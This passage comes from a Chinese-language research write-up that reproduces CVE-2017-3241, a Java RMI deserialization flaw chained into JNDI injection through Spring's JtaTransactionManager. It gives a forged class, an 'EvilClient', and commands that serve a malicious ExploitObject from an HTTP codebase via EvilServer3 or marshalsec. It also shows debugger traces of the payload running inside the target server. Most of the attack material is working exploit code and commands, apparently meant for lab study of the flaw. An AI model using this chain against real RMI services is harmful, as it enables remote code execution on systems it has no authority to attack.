|   spring-core-4.2.4.RELEASE.jar
|
+---any
|       Message3.class
|       Message3.java
|
+---fake
|       PublicKnown3.class (fake版)
|       PublicKnown3.java
|
+---normal
|       PublicKnown3.class (normal版)
|       PublicKnown3.java
|
\---other
        PublicKnown3.class (fake版)

编译:

javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" any/Message3.java
javac -encoding GBK -g SomeInterface3.java
javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:." SomeInterface3Impl.java
javac -encoding GBK -g SomeDynamicServer3.java
javac -encoding GBK -g SomeNormalClient3.java
javac -encoding GBK -g normal/PublicKnown3.java
javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:." fake/PublicKnown3.java
javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:." SomeEvilClient3.java

13.10) 测试

假设目录结构是:

.
|
+---test1
|   |   SomeDynamicServer3.class
|   |   SomeInterface3.class
|   |   SomeInterface3Impl.class
|   |   spring-tx-4.2.4.RELEASE.jar
|   |   spring-core-4.2.4.RELEASE.jar
|   |   commons-logging-1.2.jar
|   |
|   +---any
|   |       Message3.class
|   |
|   \---other
|           PublicKnown3.class (normal版)
|
\---test2
    |   SomeEvilClient3.class
    |   SomeInterface3.class
    |   SomeNormalClient3.class
    |   spring-tx-4.2.4.RELEASE.jar
    |   spring-core-4.2.4.RELEASE.jar
    |   commons-logging-1.2.jar
    |
    +---any
    |       Message3.class
    |
    \---other
            PublicKnown3.class (fake版)

在test1目录执行:

rmiregistry \
-J-Djava.class.path="spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" \
1099

java \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:." \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer3 any

在test2目录执行:

java \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:." \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeNormalClient3 any "msg from client"

java \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:." \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeEvilClient3 any "msg from client"

14) JtaTransactionManager利用链

CVE-2017-3241本质上是Java反序列化漏洞。各种PublicKnown们有各自的利用链，有
些利用链涉及JNDI注入，比如:

org.springframework.transaction.jta.JtaTransactionManager

14.1) fake版JtaTransactionManager.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:." fake/JtaTransactionManager.java
 *
 * 包名必须一样
 */
package org.springframework.transaction.jta;

import any.Message3;

/*
 * 参照fake版PublicKnown3实现fake版JtaTransactionManager
 */
public class JtaTransactionManager extends Message3
{
    /*
     * fake版JtaTransactionManager的这个值必须与normal版
     * JtaTransactionManager相同。
     */
    private static final long   serialVersionUID    = 4720255569299536580L;

    /*
     * 为了进一步触发JNDI注入漏洞，fake版必须定义该成员，并能对之赋值
     */
    private String  userTransactionName;

    public void setUserTransactionName ( String userTransactionName )
    {
        this.userTransactionName    = userTransactionName;
    }
}
--------------------------------------------------------------------------

假设明确知道服务端所用库版本，可以离线获取服务端serialVersionUID:

$ serialver -classpath "spring-tx-4.2.4.RELEASE.jar:spring-beans-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:commons-logging-1.2.jar:spring-context-4.2.4.RELEASE.jar" org.springframework.transaction.jta.JtaTransactionManager
org.springframework.transaction.jta.JtaTransactionManager:    private static final long serialVersionUID = 4720255569299536580L;

无论如何，总能在客户端异常中看到服务端serialVersionUID。

参[47]，作者实现fake版JtaTransactionManager.java时引入一个变量:

public static final String DEFAULT_USER_TRANSACTION_NAME = "java:comp/UserTransaction";

不知要干啥，反正我没引入。

14.2) EvilClientWithJtaTransactionManager.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g -cp ".:spring-tx-4.2.4.RELEASE.jar" EvilClientWithJtaTransactionManager.java
 *
 * 注意-cp中当前目录最先出现，这样才能使用fake版JtaTransactionManager
 */
import javax.naming.*;
import org.springframework.transaction.jta.JtaTransactionManager;

/*
 * 参照SomeEvilClient3实现EvilClientWithJtaTransactionManager
 */
public class EvilClientWithJtaTransactionManager
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        String          sth     = argv[1];
        /*
         * rmi://192.168.65.23:1099/any
         */
        String          evilurl = argv[2];
        Context         ctx     = new InitialContext();
        SomeInterface3  some    = ( SomeInterface3 )ctx.lookup( name );
        /*
         * 使用fake版JtaTransactionManager
         */
        JtaTransactionManager
                        jtm     = new JtaTransactionManager();
        /*
         * 通过反序列化漏洞进一步触发JNDI注入漏洞
         */
        jtm.setUserTransactionName( evilurl );
        jtm.setMsg( sth );
        some.Echo( jtm );
    }
}
--------------------------------------------------------------------------

14.3) 编译

假设目录结构是:

.
|
|   EvilClientWithJtaTransactionManager.class
|   EvilClientWithJtaTransactionManager.java
|   SomeInterface3.class
|   spring-tx-4.2.4.RELEASE.jar
|   spring-core-4.2.4.RELEASE.jar
|
+---any
|       Message3.class
|
+---fake
|       JtaTransactionManager.class (fake版)
|       JtaTransactionManager.java
|
\---org/springframework/transaction/jta/
        JtaTransactionManager.class (fake版)

编译:

javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:." fake/JtaTransactionManager.java
mkdir -p org/springframework/transaction/jta
cp fake/JtaTransactionManager.class org/springframework/transaction/jta/
javac -encoding GBK -g -cp ".:spring-tx-4.2.4.RELEASE.jar" EvilClientWithJtaTransactionManager.java

14.4) 测试

假设目录结构是:

.
|
+---test1
|   |   EvilServer3.class (参《Java RMI入门(3)》)
|   |   SomeDynamicServer3.class
|   |   SomeInterface3.class
|   |   SomeInterface3Impl.class
|   |   spring-beans-4.2.4.RELEASE.jar
|   |   spring-context-4.2.4.RELEASE.jar
|   |   spring-core-4.2.4.RELEASE.jar
|   |   spring-tx-4.2.4.RELEASE.jar
|   |   commons-logging-1.2.jar
|   |   javax.transaction-api-1.2.jar
|   |
|   \---any
|           Message3.class
|
+---test2
|   |   EvilClientWithJtaTransactionManager.class
|   |   SomeInterface3.class
|   |   spring-tx-4.2.4.RELEASE.jar
|   |   spring-core-4.2.4.RELEASE.jar
|   |   commons-logging-1.2.jar
|   |
|   +---any
|   |       Message3.class
|   |
|   \---org
|       \---springframework
|           \---transaction
|               \---jta
|                       JtaTransactionManager.class (fake版)
|
\---testserverbase
        ExploitObject.class (参《Java RMI入门(3)》)

这是充分必要的最小测试集，如欲复现，除非明确知道背后的机理，请勿乱加乱减文
件。

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test1目录执行:

rmiregistry \
-J-Djava.class.path="spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" \
1099

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
EvilServer3 attack http://192.168.65.23:8080/testserverbase/ ExploitObject

java \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:spring-beans-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer3 any

当前Java版本是8u232，必须设置两个trustURLCodebase才能得手，8u40无此必要。
SomeDynamicServer3在JNDI注入过程中扮演JNDI客户端的角色。

在test2目录执行:

java \
-cp ".:spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar" \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
EvilClientWithJtaTransactionManager any "msg from client" rmi://192.168.65.23:1099/attack

注意-cp中当前目录最先出现，这样才能使用fake版JtaTransactionManager。

如果一切顺利，恶意构造函数ExploitObject()将在SomeDynamicServer3进程空间得
到执行，输出"scz is here"，生成"/tmp/scz_is_here"。

14.4.1) ExploitObject()调用栈回溯

调试SomeDynamicServer3:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:spring-beans-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer3 any

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in ExploitObject.<init>

  [1] ExploitObject.<init> (ExploitObject.java:9), pc = 0
  [2] sun.reflect.NativeConstructorAccessorImpl.newInstance0 (native method)
  [3] sun.reflect.NativeConstructorAccessorImpl.newInstance (NativeConstructorAccessorImpl.java:62), pc = 85
  [4] sun.reflect.DelegatingConstructorAccessorImpl.newInstance (DelegatingConstructorAccessorImpl.java:45), pc = 5
  [5] java.lang.reflect.Constructor.newInstance (Constructor.java:423), pc = 79
  [6] java.lang.Class.newInstance (Class.java:442), pc = 138
  [7] javax.naming.spi.NamingManager.getObjectFactoryFromReference (NamingManager.java:163), pc = 46
  [8] javax.naming.spi.NamingManager.getObjectInstance (NamingManager.java:319), pc = 94
  [9] com.sun.jndi.rmi.registry.RegistryContext.decodeObject (RegistryContext.java:499), pc = 97
  [10] com.sun.jndi.rmi.registry.RegistryContext.lookup (RegistryContext.java:138), pc = 75
  [11] com.sun.jndi.toolkit.url.GenericURLContext.lookup (GenericURLContext.java:205), pc = 23
  [12] javax.naming.InitialContext.lookup (InitialContext.java:417), pc = 6
  [13] org.springframework.jndi.JndiTemplate$1.doInContext (JndiTemplate.java:155), pc = 5
  [14] org.springframework.jndi.JndiTemplate.execute (JndiTemplate.java:87), pc = 7
  [15] org.springframework.jndi.JndiTemplate.lookup (JndiTemplate.java:152), pc = 55
  [16] org.springframework.jndi.JndiTemplate.lookup (JndiTemplate.java:179), pc = 2
  [17] org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction (JtaTransactionManager.java:571), pc = 52
  [18] org.springframework.transaction.jta.JtaTransactionManager.initUserTransactionAndTransactionManager (JtaTransactionManager.java:448), pc = 23
  [19] org.springframework.transaction.jta.JtaTransactionManager.readObject (JtaTransactionManager.java:1,206), pc = 16
  [20] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [21] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [22] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [23] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [24] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [25] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [26] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [27] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [28] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [29] sun.rmi.server.UnicastRef.unmarshalValue (UnicastRef.java:322), pc = 171
  [30] sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked (UnicastServerRef.java:629), pc = 31
  [31] sun.rmi.server.UnicastServerRef.unmarshalParameters (UnicastServerRef.java:617), pc = 23
  [32] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:338), pc = 168
  [33] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
  [34] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
  [35] java.security.AccessController.doPrivileged (native method)
  [36] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
  [37] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
  [38] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:834), pc = 696
  [39] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
  [40] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.143860313.run (null), pc = 4
  [41] java.security.AccessController.doPrivileged (native method)
  [42] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
  [43] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
  [44] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
  [45] java.lang.Thread.run (Thread.java:748), pc = 11

1至28号栈帧与"8.5.1) ExploitObject()调用栈回溯"小节完全相同。19号栈帧在调
JtaTransactionManager.readObject()。29号栈帧是UnicastRef.unmarshalValue()，
惹祸精。

这个调用栈就深了，先是通过RMI触发远程可控反序列化，再进一步触发JNDI注入。

14.4.2) 用rmi-dumpregistry.nse观察周知端口

$ nmap -n -Pn -p 1099 --script rmi-dumpregistry.nse 192.168.65.23

PORT     STATE SERVICE
1099/tcp open  java-rmi
| rmi-dumpregistry:
|   attack
|     com.sun.jndi.rmi.registry.ReferenceWrapper_Stub
|     @192.168.65.23:35819
|     extends
|       java.rmi.server.RemoteStub
|       extends
|         java.rmi.server.RemoteObject
|   any
|      implements java.rmi.Remote, SomeInterface3,
|     extends
|       java.lang.reflect.Proxy
|       fields
|           Ljava/lang/reflect/InvocationHandler; h
|             java.rmi.server.RemoteObjectInvocationHandler
|             @192.168.65.23:36658
|             extends
|_              java.rmi.server.RemoteObject

EvilServer3直接绑定Reference，没有显式使用ReferenceWrapper，想不到背后还是
涉及ReferenceWrapper_Stub。

之前以为用rmi-dumpregistry.nse能看到AbstractPlatformTransactionManager的身
影，想多了。看到了SomeInterface3。

14.4.3) 用marshalsec测试

假设目录结构是:

.
|
+---test1
|   |   marshalsec-0.0.3-SNAPSHOT-all.jar (替换掉EvilServer3.class)
|   |   SomeDynamicServer3.class
|   |   SomeInterface3.class
|   |   SomeInterface3Impl.class
|   |   spring-beans-4.2.4.RELEASE.jar
|   |   spring-context-4.2.4.RELEASE.jar
|   |   spring-core-4.2.4.RELEASE.jar
|   |   spring-tx-4.2.4.RELEASE.jar
|   |   commons-logging-1.2.jar
|   |   javax.transaction-api-1.2.jar
|   |
|   \---any
|           Message3.class
|
+---test2
|   |   EvilClientWithJtaTransactionManager.class
|   |   SomeInterface3.class
|   |   spring-tx-4.2.4.RELEASE.jar
|   |   spring-core-4.2.4.RELEASE.jar
|   |   commons-logging-1.2.jar
|   |
|   +---any
|   |       Message3.class
|   |
|   \---org
|       \---springframework
|           \---transaction
|               \---jta
|                       JtaTransactionManager.class (fake版)
|
\---testserverbase
        ExploitObject.class (参《Java RMI入门(3)》)

在testserverbase的父目录执行:

python3 -m http.server -b 192.168.65.23 8080

在test1目录执行:

rmiregistry \
-J-Djava.class.path="spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" \
1099

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.65.23:8080/testserverbase/#ExploitObject 2099

java \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:spring-beans-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer3 any

在test2目录执行:

java \
-cp ".:spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar" \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
EvilClientWithJtaTransactionManager any "msg from client" rmi://192.168.65.23:2099/whatever

15) 为什么Message3需要继承AbstractPlatformTransactionManager

调试SomeDynamicServer3:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true \
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true \
-cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:commons-logging-1.2.jar:spring-beans-4.2.4.RELEASE.jar:javax.transaction-api-1.2.jar:spring-context-4.2.4.RELEASE.jar:." \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer3 any

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in org.springframework.transaction.support.AbstractPlatformTransactionManager.readObject

    org.springframework.transaction.jta.JtaTransactionManager(org.springframework.transaction.support.AbstractPlatformTransactionManager).readObject(java.io.ObjectInputStream) line: 1273
    sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [native method]
    sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 62
    sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 43
    java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: 498
    java.io.ObjectStreamClass.invokeReadObject(java.lang.Object, java.io.ObjectInputStream) line: 1170
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 2177
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 2068
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1572
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject() line: 430
    sun.rmi.server.UnicastRef.unmarshalValue(java.lang.Class<?>, java.io.ObjectInput) line: 322
    sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(java.lang.reflect.Method, java.io.ObjectInput) line: 629
    sun.rmi.server.UnicastServerRef.unmarshalParameters(java.lang.Object, java.lang.reflect.Method, sun.rmi.server.MarshalInputStream) line: 617
    sun.rmi.server.UnicastServerRef.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall) line: 338
    sun.rmi.transport.Transport$1.run() line: 200
    sun.rmi.transport.Transport$1.run() line: 197
    java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
    sun.rmi.transport.tcp.TCPTransport(sun.rmi.transport.Transport).serviceCall(java.rmi.server.RemoteCall) line: 196
    sun.rmi.transport.tcp.TCPTransport.handleMessages(sun.rmi.transport.Connection, boolean) line: 573
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0() line: 834
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0() line: 688
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.548107027.run() line: not available
    java.security.AccessController.doPrivileged(java.security.PrivilegedAction<T>, java.security.AccessControlContext) line: not available [native method]
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run() line: 687
    java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) line: 1149
    java.util.concurrent.ThreadPoolExecutor$Worker.run() line: 624
    java.lang.Thread.run() line: 748

--------------------------------------------------------------------------
private void readObject(ObjectInputStream ois)
    throws IOException, ClassNotFoundException
{
    ois.defaultReadObject();
    /*
     * 1276行，如果流程不经此处，this.logger将为null
     */
    this.logger = LogFactory.getLog(getClass());
}
--------------------------------------------------------------------------

如果Message3没有继承AbstractPlatformTransactionManager，则fake版
JtaTransactionManager也没有继承AbstractPlatformTransactionManager；客户端
提交的序列化数据中没有AbstractPlatformTransactionManager的信息，服务端反序
列化时不会调用AbstractPlatformTransactionManager.readObject()，流程不会经
过前述1276行，this.logger将为null。

fake版JtaTransactionManager必须继承Message3，才能通过SomeDynamicServer3加
载normal版JtaTransactionManager，这是SomeInterface3产生的约束。Java不支持
多重继承，fake版JtaTransactionManager没法同时显式继承Message3、
AbstractPlatformTransactionManager。最后只能让Message3先继承
AbstractPlatformTransactionManager，再让fake版JtaTransactionManager继承
Message3，以此满足fake版JtaTransactionManager必须继承
AbstractPlatformTransactionManager的约束条件。一切都是为了让this.logger不
为null。

在现实世界中，Message3可没这么"好心"地先去继承
AbstractPlatformTransactionManager，比如Message2就是如此，此时this.logger
将为null。

stop in org.springframework.transaction.jta.JtaTransactionManager.readObject

    org.springframework.transaction.jta.JtaTransactionManager.readObject(java.io.ObjectInputStream) line: 1200
    sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [native method]
    sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 62
    sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 43
    java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: 498
    java.io.ObjectStreamClass.invokeReadObject(java.lang.Object, java.io.ObjectInputStream) line: 1170
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 2177
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 2068
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1572
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject() line: 430
    sun.rmi.server.UnicastRef.unmarshalValue(java.lang.Class<?>, java.io.ObjectInput) line: 322
    sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(java.lang.reflect.Method, java.io.ObjectInput) line: 629
    sun.rmi.server.UnicastServerRef.unmarshalParameters(java.lang.Object, java.lang.reflect.Method, sun.rmi.server.MarshalInputStream) line: 617
    sun.rmi.server.UnicastServerRef.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall) line: 338
    sun.rmi.transport.Transport$1.run() line: 200
    sun.rmi.transport.Transport$1.run() line: 197
    java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
    sun.rmi.transport.tcp.TCPTransport(sun.rmi.transport.Transport).serviceCall(java.rmi.server.RemoteCall) line: 196
    sun.rmi.transport.tcp.TCPTransport.handleMessages(sun.rmi.transport.Connection, boolean) line: 573
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0() line: 834
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0() line: 688
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.548107027.run() line: not available
    java.security.AccessController.doPrivileged(java.security.PrivilegedAction<T>, java.security.AccessControlContext) line: not available [native method]
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run() line: 687
    java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) line: 1149
    java.util.concurrent.ThreadPoolExecutor$Worker.run() line: 624
    java.lang.Thread.run() line: 748

先命中AbstractPlatformTransactionManager.readObject()，再命中
JtaTransactionManager.readObject()，前者是父类。

stop in org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction
stop at org.springframework.transaction.jta.JtaTransactionManager:568

    org.springframework.transaction.jta.JtaTransactionManager.lookupUserTransaction(java.lang.String) line: 568
    org.springframework.transaction.jta.JtaTransactionManager.initUserTransactionAndTransactionManager() line: 448
    org.springframework.transaction.jta.JtaTransactionManager.readObject(java.io.ObjectInputStream) line: 1206
    sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [native method]
    sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 62
    sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 43
    java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: 498
    java.io.ObjectStreamClass.invokeReadObject(java.lang.Object, java.io.ObjectInputStream) line: 1170
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 2177
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readOrdinaryObject(boolean) line: 2068
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject0(boolean) line: 1572
    sun.rmi.transport.ConnectionInputStream(java.io.ObjectInputStream).readObject() line: 430
    sun.rmi.server.UnicastRef.unmarshalValue(java.lang.Class<?>, java.io.ObjectInput) line: 322
    sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(java.lang.reflect.Method, java.io.ObjectInput) line: 629
    sun.rmi.server.UnicastServerRef.unmarshalParameters(java.lang.Object, java.lang.reflect.Method, sun.rmi.server.MarshalInputStream) line: 617
    sun.rmi.server.UnicastServerRef.dispatch(java.rmi.Remote, java.rmi.server.RemoteCall) line: 338
    sun.rmi.transport.Transport$1.run() line: 200
    sun.rmi.transport.Transport$1.run() line: 197
    java.security.AccessController.doPrivileged(java.security.PrivilegedExceptionAction<T>, java.security.AccessControlContext) line: not available [native method]
    sun.rmi.transport.tcp.TCPTransport(sun.rmi.transport.Transport).serviceCall(java.rmi.server.RemoteCall) line: 196
    sun.rmi.transport.tcp.TCPTransport.handleMessages(sun.rmi.transport.Connection, boolean) line: 573
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0() line: 834
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0() line: 688
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.548107027.run() line: not available
    java.security.AccessController.doPrivileged(java.security.PrivilegedAction<T>, java.security.AccessControlContext) line: not available [native method]
    sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run() line: 687
    java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) line: 1149
    java.util.concurrent.ThreadPoolExecutor$Worker.run() line: 624
    java.lang.Thread.run() line: 748

--------------------------------------------------------------------------
protected UserTransaction lookupUserTransaction(String userTransactionName)
    throws TransactionSystemException
{
    try
    {
        /*
         * 568行，若this.logger为null，流程在引触发空指针异常
         */
        if (this.logger.isDebugEnabled())
        {
            this.logger.debug("Retrieving JTA UserTransaction from JNDI location [" + userTransactionName + "]");
        }
        /*
         * 571行，要想JtaTransactionManager利用链得手，流程必须至此
         */
        return (UserTransaction)getJndiTemplate().lookup(userTransactionName, UserTransaction.class);
    }
    catch (NamingException ex)
    {
        throw new TransactionSystemException("JTA UserTransaction is not available at JNDI location [" + userTransactionName + "]", ex);
    }
}
--------------------------------------------------------------------------

起初我参照fake版PublicKnown2实现fake版JtaTransactionManager，继承Message2，
测试时发现服务端总在前述568行处抛出空指针异常，this.logger为null。但同样是
JtaTransactionManager利用链，用VulnerableServer测试时可以得手，于是调试
VulnerableServer，看this.logger到底在哪里被赋值，就这样找到
AbstractPlatformTransactionManager.readObject()。

再回头看[47]，作者其实点了这件事，他提到要稍作修改Message，他那个修改版
Message继承了AbstractPlatformTransactionManager。作者没有说为什么需要稍作
修改，也没有强调必须做这个修改，看他文章时就没在意。

这个洞的本质就是Message、PublicKnown所演示的那样。如今看来，随着所挑选的
PublicKnown不同，对Message产生的约束也不同。现实中Message不可控，不可能为
了适配fake版JtaTransactionManager，改出个Message3来。如果服务端本来就没有
使用Message3的等价类，JtaTransactionManager利用链无法成功。对那些Java框架、
Java中间件完全不了解，现实世界中有哪个动态端口使用Message3的等价类吗？

☆ 参考资源

[47]
    Java RMI远程反序列化任意类及远程代码执行解析(CVE-2017-3241) - jfeiyi [2017-02-15]
    https://www.freebuf.com/vuls/126499.html

    https://packetstormsecurity.com/files/download/141104/cve-2017-3241.pdf
    https://dl.packetstormsecurity.net/1702-exploits/cve-2017-3241.pdf

    Oracle Critical Patch Update Advisory January 2017
    https://www.oracle.com/security-alerts/cpujan2017.html

    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3241

[62]
    Attacking Java RMI services after JEP 290 - Hans Martin Munch [2019-03]
    https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/